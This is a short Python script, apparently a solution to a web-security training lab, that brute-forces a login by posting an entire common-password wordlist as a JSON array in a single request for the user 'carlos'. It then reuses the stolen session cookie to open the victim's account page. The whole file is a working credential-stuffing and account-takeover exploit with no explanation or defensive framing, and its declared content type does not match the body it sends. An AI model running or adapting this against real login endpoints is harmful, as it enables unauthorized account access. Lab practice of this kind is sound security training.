import requests
import sys
import urllib3
import json

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) # type: ignore

# Burp Suite proxy
proxies = {
    'http': 'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080',  
}

headers = {
    'Content-Type': 'application/x-www-form-urlencoded',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36'
}

passwords = open('./../common_password.txt', 'r', encoding='utf-8').read().strip().split('\n')

def brute_force(s, url, username) -> str:
    login_url = url + '/login'
    payload = {
        "username": username,
        "password": passwords
    }
    r = s.post(login_url, data=json.dumps(payload), headers=headers, allow_redirects=False)

    print(r.text)

    if r.status_code == 302:
        print("[+] Success")
        return r.cookies['session']
    else:
        print("[-] Wordlist not contain victim password")
        sys.exit(-1)

def login_acc_by_cookies(s, url, session_cookies):
    my_account_url = url + '/my-account'
    cookie = { 'session': session_cookies }
    r = s.get(my_account_url, cookies=cookie, headers=headers)

    if 'Log out' in r.text:
        print("[+] Successfull login by cookie")
        sys.exit(0)
    else:
        print("[-] Fail to login by cookie")
        sys.exit(-1)

def main():
    if len(sys.argv) != 2:
        print("(+) Usage: %s <url>" % sys.argv[0])
        print("(+) Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    s = requests.Session()
    url = sys.argv[1]

    session_cookies = brute_force(s, url, 'carlos')
    login_acc_by_cookies(s, url, session_cookies)

if __name__ == '__main__':
    main()